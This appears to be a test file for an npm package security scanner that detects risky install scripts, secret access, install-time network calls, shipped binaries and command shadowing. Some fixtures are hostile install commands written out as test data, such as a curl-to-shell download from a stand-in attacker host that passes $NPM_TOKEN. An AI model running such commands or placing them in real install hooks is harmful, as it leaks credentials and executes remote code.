import { describe, expect, it } from 'vitest';
import { analyze } from './helpers.js';
import { analyzeInstallScripts, normalizeBin, shellWords, splitCommand } from '../src/analysis/install.js';
import { analyzeFiles } from '../src/analysis/analyze.js';
import { nativeAddon, toBuffers } from './fixtures/packages.mjs';

const files = new Set(['install.js', 'scripts/setup.js', 'lib/index.js', 'build.sh']);

describe('install scripts', () => {
  it('splits commands on shell operators and respects quotes', () => {
    expect(splitCommand('a && b || c; d | e')).toEqual(['a', 'b', 'c', 'd', 'e']);
    expect(splitCommand('node -e "a && b"')).toEqual(['node -e "a && b"']);
    expect(shellWords(`node -e "console.log('hi there')" x`)).toEqual(['node', '-e', "console.log('hi there')", 'x']);
  });

  it('finds the files a script runs', () => {
    const [s] = analyzeInstallScripts({ postinstall: 'node ./scripts/setup' }, files, false);
    expect(s).toMatchObject({ event: 'postinstall', targets: ['scripts/setup.js'], flags: ['node-script'], implicit: false });
  });

  it('follows npm run indirection and skips env assignments', () => {
    const [s] = analyzeInstallScripts({ install: 'cross-env FOO=1 npm run build', build: 'node install.js' }, files, false);
    expect(s!.targets).toEqual(['install.js']);
  });

  it('captures inline node -e code and remote-package runners', () => {
    const [s] = analyzeInstallScripts({ preinstall: 'node -e "require(\'https\').get(\'https://x.example\')"' }, files, false);
    expect(s!.flags).toContain('inline-code');
    expect(s!.inlineCode).toEqual(["require('https').get('https://x.example')"]);
    const [n] = analyzeInstallScripts({ postinstall: 'npx some-installer@latest' }, files, false);
    expect(n!.flags).toContain('remote-package');
  });

  it('flags downloads piped to a shell and secret expansion', () => {
    const [s] = analyzeInstallScripts({ postinstall: 'curl -s https://evil.example/x.sh | sh -s -- $NPM_TOKEN' }, files, false);
    expect(s!.flags).toEqual(expect.arrayContaining(['shell-download', 'pipe-to-shell', 'env-secret', 'shell-script']));
    expect(s!.secrets).toEqual(['NPM_TOKEN']);
  });

  it('recognises native build tooling and the implicit node-gyp step', () => {
    const [s] = analyzeInstallScripts({ install: 'prebuild-install || node-gyp rebuild' }, files, true);
    expect(s!.flags).toEqual(expect.arrayContaining(['native-build', 'known-tool']));
    const implicit = analyzeInstallScripts({}, files, true);
    expect(implicit).toEqual([expect.objectContaining({ event: 'install', command: 'node-gyp rebuild', implicit: true })]);
    expect(analyzeInstallScripts({ install: 'node-gyp-build' }, files, true)).toHaveLength(1);
  });

  it('ignores non-install lifecycle scripts', () => {
    expect(analyzeInstallScripts({ test: 'vitest', build: 'tsup', prepublishOnly: 'npm test' }, files, false)).toEqual([]);
  });

  it('normalizes bin fields', () => {
    expect(normalizeBin('./cli.js', '@scope/tool')).toEqual({ tool: 'cli.js' });
    expect(normalizeBin({ a: './a.js', b: 1 }, 'x')).toEqual({ a: 'a.js' });
    expect(normalizeBin(undefined, 'x')).toEqual({});
  });
});

describe('install-time attribution', () => {
  it('marks code reached from an install script as install-time', () => {
    const a = analyze(
      {
        'package.json': JSON.stringify({ name: 'p', version: '1.0.0', scripts: { postinstall: 'node install.js' } }),
        'install.js': "require('./lib/fetcher');",
        'lib/fetcher.js': "require('https').get('https://downloads.example.net/bin');",
        'lib/other.js': "require('fs');",
      },
      'p',
    );
    expect(a.capabilities.network?.installTime).toBe(true);
    expect(a.capabilities.network?.installTimeValues).toEqual(['https']);
    expect(a.capabilities.fs?.installTime).toBe(false);
    expect(a.files.find((f) => f.path === 'lib/fetcher.js')?.installTime).toBe(true);
    expect(a.capabilities['install-script']?.values).toEqual(['postinstall']);
  });

  it('analyzes inline install code as a virtual file', () => {
    const a = analyze({
      'package.json': JSON.stringify({ name: 'p', version: '1.0.0', scripts: { install: 'node -e "fetch(process.env.NPM_TOKEN)"' } }),
    });
    expect(a.capabilities['env-secrets']?.installTimeValues).toEqual(['NPM_TOKEN']);
    expect(a.capabilities.network?.evidence[0]?.file).toBe('package.json#scripts.install');
  });

  it('points install-script evidence at the package.json line', () => {
    const a = analyzeFiles(toBuffers(nativeAddon()));
    const ev = a.capabilities['install-script']?.evidence[0];
    expect(ev).toMatchObject({ file: 'package.json', value: 'install' });
    expect(ev!.line).toBeGreaterThan(1);
    expect(ev!.excerpt).toContain('node-gyp-build');
  });

  it('records bin entries and flags system command shadowing', () => {
    const a = analyze({ 'package.json': JSON.stringify({ name: 'p', version: '1.0.0', bin: { git: 'x.js', 'p-cli': 'cli.js' } }), 'x.js': '', 'cli.js': '' });
    expect(a.capabilities.bin?.values).toEqual(['git (shadows a system command)', 'p-cli']);
  });

  it('detects shipped binaries by extension and by magic bytes', () => {
    const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.alloc(64)]);
    const map = toBuffers({ 'package.json': JSON.stringify({ name: 'p', version: '1.0.0' }), 'addon.node': 'x' });
    map.set('bin/helper.txt', elf);
    const a = analyzeFiles(map);
    expect(a.capabilities['native-binary']?.values).toEqual(['addon.node', 'bin/helper.txt']);
  });

  it('skips files matched by ignorePaths', () => {
    const map = toBuffers({ 'package.json': '{"name":"p","version":"1.0.0"}', 'test/evil.js': "require('child_process')", 'index.js': '' });
    const a = analyzeFiles(map, { ignorePaths: ['test/**'] });
    expect(a.capabilities.child_process).toBeUndefined();
    expect(a.stats.skippedFiles).toBe(1);
  });

  it('survives a missing or broken package.json', () => {
    const a = analyzeFiles(toBuffers({ 'package.json': '{ broken', 'index.js': "require('fs')" }), { name: 'fallback', version: '9.9.9' });
    expect(a.name).toBe('fallback');
    expect(a.version).toBe('9.9.9');
    expect(a.capabilities.fs?.values).toEqual(['fs']);
  });

  it('skips type declarations and analyzes shebang scripts without extensions', () => {
    const a = analyze({ 'index.d.ts': "declare const x: typeof import('child_process');", 'bin/tool': "#!/usr/bin/env node\nrequire('net');" });
    expect(a.capabilities.child_process).toBeUndefined();
    expect(a.capabilities.network?.values).toEqual(['net']);
  });
});
